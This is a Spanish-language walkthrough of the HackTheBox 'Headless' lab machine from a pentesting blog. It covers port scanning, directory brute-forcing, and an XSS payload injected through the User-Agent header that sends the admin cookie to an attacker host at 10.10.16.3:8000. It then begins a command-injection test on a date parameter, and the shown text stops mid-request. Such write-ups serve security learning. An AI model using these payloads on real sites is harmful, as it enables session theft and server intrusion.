<!doctype html><html lang=es><head><title>HTB Headless WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Headless' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Headless WriteUp"><meta name=twitter:description content="HackThebox 'Headless' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/headless/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Headless WriteUp"><meta property="og:description" content="HackThebox 'Headless' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-07-19T00:00:00+00:00"><meta property="article:modified_time" content="2024-07-19T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Burpsuite"><meta property="article:tag" content="Sudo"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/headless/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/headless/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/headless/>HTB Headless WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-07-19T00:00:00Z>19 julio, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
10 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/sudo/>Sudo</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/command-injection/>Command Injection</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/whatweb/>Whatweb</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/xss/>Xss</a></span></div></div></header><div class=post-content><h1 id=headless----hackthebox>Headless &ndash; HackTheBox
<a class=heading-link href=#headless----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty / Dificultad: <em>Easy</em> / <em>F√°cil</em></li><li>Platform / Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Headless&rsquo; Avatar" src=/pentesting/images/Headless_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Headless</code> es una m√°quina de dificultad &ldquo;F√°cil&rdquo; de la plataforma <code>HackTheBox</code>. De un escaneo inicial, notamos que la m√°quina v√≠ctima est√° corriendo un servicio web sobre el puerto <code>5000</code>, el cual muestra una p√°gina web la cual sigue &ldquo;en construcci√≥n&rdquo;. Notamos que podemos rellenar un formulario en esta p√°gina web. No obstante, al intentar subir c√≥digo malicioso al formulaio, la p√°gina web nos muestra un mensaje de &ldquo;Hacking Attempts&rdquo;; lo cual en principio deniega los ataques. Luego de analizar la web (y basados en el nombre de la m√°quina) somos capaces de inyectar un payload de <code>Cross Site Scripting</code> (<code>XSS</code>) a trav√©s del &ldquo;header&rdquo; de la petici√≥n al servicio web. Con esto obtenemos una cookie para un panel de login, el cual fue previamente hallado mediante un ataque de <code>Brute Force Directory Listing</code> (listar directorios por fuerza bruta). Una vez logueados con esta cookie secuestrada, podemos ver una p√°gina web la cual muestra un sitio para agendar horas la cual s√≥lo tiene un bot√≥n. Uno de los par√°metros que se env√≠an al servidor web al apretar sobre este bot√≥n es vulnerable a un <code>Command Injection</code> (inyecci√≥n de comandos), lo cual nos permite ganar acceso inicial a la m√°quina v√≠ctima. Una vez dentro, vemos que el usuario con el que estamos logueados puede correr un script de <code>Bash</code> con <code>sudo</code>. Este script busca por otro script en el directorio actual de trabajo y lo ejecuta. De manera que creamos un script malicioso en el directorio actual de trabajo, ejecutamos el primer script con <code>sudo</code> (el cual ejecutar√° nuestro script malicioso como <code>root</code>) y ganamos acceso total a la m√°quina v√≠ctima.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Empezando con un scan con <code>Nmap</code> s√≥lo encontramos 2 puertos abiertos: <code>22</code> <code>SSH</code> y <code>5000</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,5000 10.10.11.8 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 21:04 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.8
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.19s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>5000/tcp open  upnp?
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   GetRequest:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 200 OK
</span></span></span><span class=line><span class=cl><span class=go>|     Server: Werkzeug/2.2.2 Python/3.11.2
</span></span></span><span class=line><span class=cl><span class=go>|     Date: Sun, 26 May 2024 01:04:46 GMT
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html; charset=utf-8
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 2799
</span></span></span><span class=line><span class=cl><span class=go>|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;title&gt;Under Construction&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;style&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     body {
</span></span></span><span class=line><span class=cl><span class=go>|     font-family: &#39;Arial&#39;, sans-serif;
</span></span></span><span class=line><span class=cl><span class=go>|     background-color: #f7f7f7;
</span></span></span><span class=line><span class=cl><span class=go>|     margin: 0;
</span></span></span><span class=line><span class=cl><span class=go>|     padding: 0;
</span></span></span><span class=line><span class=cl><span class=go>|     display: flex;
</span></span></span><span class=line><span class=cl><span class=go>|     justify-content: center;
</span></span></span><span class=line><span class=cl><span class=go>|     align-items: center;
</span></span></span><span class=line><span class=cl><span class=go>|     height: 100vh;
</span></span></span><span class=line><span class=cl><span class=go>|     .container {
</span></span></span><span class=line><span class=cl><span class=go>|     text-align: center;
</span></span></span><span class=line><span class=cl><span class=go>|     background-color: #fff;
</span></span></span><span class=line><span class=cl><span class=go>|     border-radius: 10px;
</span></span></span><span class=line><span class=cl><span class=go>|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
</span></span></span><span class=line><span class=cl><span class=go>|   RTSPRequest:
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;!DOCTYPE HTML&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;/html&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Del output de √©ste puedo ver que el puerto <code>5000</code> est√° corriendo <code>Werkzeug</code> con <code>Python</code>. De manera que muy probablemente este es un sitio web corriendo <code>Flask</code>. Podemos verificar esto utilizando la herramienta <code>WhatWeb</code> contra la m√°quina v√≠ctima y el puerto <code>5000</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ whatweb http://10.10.11.8:5000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://10.10.11.8:5000 [200 OK] Cookies[is_admin], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[10.10.11.8], Python[3.11.2], Script, Title[Under Construction], Werkzeug[2.2.2]
</span></span></span></code></pre></div><ul><li>Visitiando la p√°gina web <code>http://10.10.11.8:5000</code> muestra que la p√°gina en s√≠ no est√° lista, junto con una cuenta regresiva:</li></ul><p><img alt="Headless 1" src=/pentesting/images/Headless_1.png></p><ul><li>All√≠ puedo ver un bot√≥n que dice <code>For questions</code>. Clickeando en este redirige a <code>http://10.10.11.8:5000/support</code> y muestra un formulario de contacto (&ldquo;Contact form&rdquo;):</li></ul><p><img alt="Headless 2" src=/pentesting/images/Headless_2.png></p><ul><li>Si pruebo algunos par√°metros vulnerables en este &ldquo;Contact form&rdquo;, lo intercepto con <code>Burpsuite</code> y luego intento, por ejemplo, un ataque <code>Cross Site Scripting</code> (<code>XSS</code>) con el request:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/support</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>245</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000/support</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>fname=&#34;http%3a//10.10.16.3%3a8000/fname&#34;%3b&gt;&amp;lname=&#34;http%3a//10.10.16.3%3a8000/lname&#34;%3b&gt;&amp;email=&#34;http%3a//10.10.16.3%3a8000/email&#34;%3b&gt;&amp;phone=&#34;http%3a//10.10.16.3%3a8000/phone&#34;%3b&gt;&amp;message=&lt;img+src%3d&#34;http%253a//10.10.16.3%253a8000/message&#34;%253b&gt;
</span></span></code></pre></div><p>la p√°gina web muestra un mensaje <code>Hacking Attempt Detected</code> (&ldquo;Intento de hackeo detectado&rdquo;):</p><p><img alt="Headless 3" src=/pentesting/images/Headless_3.png></p><ul><li>En este punto decido buscar por m√°s directorios en este servicio web a trav√©s de un <code>Brute Force Directory Listing</code> (listar directorios con fuerza bruta) con la herramienta <code>Gobuster</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.8:5000 -t 55 -x html
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://10.10.11.8:5000
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              html
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/support              (Status: 200) [Size: 2363]
</span></span></span><span class=line><span class=cl><span class=go>/dashboard            (Status: 500) [Size: 265]
</span></span></span></code></pre></div><p>Puedo ver un directorio <code>/dashboard</code>, pero √©ste retorna <code>C√≥digo HTTP 500 (Internal Server Error)</code>.</p><ul><li>De vuelta al formulario de &ldquo;Contact Support&rdquo;, enviar√© la petici√≥n/request que previamente realic√© para probar el ataque <code>XSS</code> al <code>Repeater</code> de <code>Burpsuite</code> para empezar a jugar con par√°metros. Intentar√© inyectar payload de <code>XSS</code> de <code>PayloadAllTheThings</code> usando <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss class=external-link target=_blank rel=noopener>estos ejemplos</a>. Luego de algunos intentos, hay uno que funciona (como se explicar√° a continuaci√≥n). Pero contrario a los intentos previos que fueron detectados como &ldquo;hacking attempts&rdquo;, esta vez somos capaces de subir un payload <code>XSS</code> el cual es:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=o>=</span><span class=s2>&#34;http://10.10.16.3:8000/xss-76.js?cookie=&#34;</span><span class=o>+</span><span class=nx>btoa</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>);</span><span class=o>&lt;</span><span class=err>/script&gt;  </span>
</span></span></code></pre></div><p>donde <code>10.10.16.3</code> es mi direcci√≥n IP de atacante y <code>8000</code> es el puerto en el cual me pondr√© en escucha con <code>netcat</code>, como sigue:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 8000 ...
</span></span></span></code></pre></div><ul><li>Luego, si <em>tambi√©n</em> inyectamos el payload <code>XSS</code> en el par√°metro <code>User-Agent</code> (el &ldquo;header&rdquo; del request, lo cual es una pista de la m√°quina basada en su nombre), en lugar de s√≥lo hacer <code>POST</code> con data, con la siguiente petici√≥n en el <code>Repeater</code> de <code>Burpsuite</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/support</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>&lt;script&gt;document.location=&#34;http://10.10.16.3:8000/xss-76.js?cookie=&#34;+btoa(document.cookie);&lt;/script&gt;</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>172</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000/support</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>fname=John&amp;lname=Wick&amp;email=test%40test.htb&amp;phone=%2B5699999999&amp;message=&lt;script&gt;document.location=&#34;http://10.10.16.3:8000/xss-76.js?cookie=&#34;+btoa(document.cookie);&lt;/script&gt;
</span></span></code></pre></div><p>tenemos algo.</p><p>Para aclarar: en mi caso, si s√≥lo pon√≠a el payload <code>XSS</code> en el header <code>User-Agent</code>, junto con un &ldquo;body&rdquo; del request/petici√≥n normal no ocurr√≠a nada. Pero cuando generaba la respuesta <code>Hacking Attempt Detected</code> poniendo la data tanto en el <code>User-Agent</code> como en el &ldquo;body&rdquo; de √©ste es que logr√© tener una respuesta en mi listener de <code>netcat</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 8000
</span></span></span><span class=line><span class=cl><span class=go>listening on [any] 8000 ...
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>connect to [10.10.16.3] from (UNKNOWN) [10.10.11.8] 47814
</span></span></span><span class=line><span class=cl><span class=go>GET /xss-76.js?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=go>Host: 10.10.16.3:8000
</span></span></span><span class=line><span class=cl><span class=go>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span></span></span><span class=line><span class=cl><span class=go>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span></span></span><span class=line><span class=cl><span class=go>Accept-Language: en-US,en;q=0.5
</span></span></span><span class=line><span class=cl><span class=go>Accept-Encoding: gzip, deflate
</span></span></span><span class=line><span class=cl><span class=go>Referer: http://localhost:5000/
</span></span></span><span class=line><span class=cl><span class=go>Connection: keep-alive
</span></span></span><span class=line><span class=cl><span class=go>Upgrade-Insecure-Requests: 1
</span></span></span></code></pre></div><ul><li>La cookie est√° encodeada en <code>base64</code> por el payload que hemos inyectado. De manera que la decodifico:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo -n &#39;aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
</span></span></span></code></pre></div><p>donde, presumo, √©sta es una cookie v√°lida como <code>admin</code>.</p><ul><li>De vuelta a los directories hallados con <code>Gobuster</code> recuerdo que hab√≠a un directorio <code>/dashboard</code>. Si visito esta p√°gina, √©sta muestra un simple mensaje:</li></ul><p><img alt="Headless 4" src=/pentesting/images/Headless_4.png></p><ul><li>En <code>Firefox</code>, voy a <code>Storage</code> (presiono <code>Ctrl+Shift+I</code>) y puedo ver que el sitio provee una cookie con el par√°metro <code>is_admin</code>. Reemplazo el valor de √©sta con el valor de la cookie hallada por medio del ataque <code>XSS</code> y recargo la p√°gina. Ahora puedo ver una nueva web:</li></ul><p><img alt="Healess 5" src=/pentesting/images/Headless_5.png></p><ul><li>Si clickeo en <code>Generate Report</code> el sitio simplemente muestra un mensaje <code>Systems are up and running!</code>, pero -aparentemente- nada m√°s.</li><li>Para ver qu√© es lo que realmente hace este panel, interceptar√© -con <code>Burpsuite</code>- el request/petici√≥n enviada cuando clickeamos en el bot√≥n <code>Generate Report</code>. La petici√≥n interceptada es:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/dashboard</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>19</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000/dashboard</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>date=2023-09-18
</span></span></code></pre></div><ul><li>Veamos si el par√°metro <code>date</code> nos permite inyectar comandos. Para ello simplemente agrego el string <code>; id</code> al par√°metro <code>date</code>. De manera que la petici√≥n (con el payload inclu√≠do) ahora se ve como:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/dashboard</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>19</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
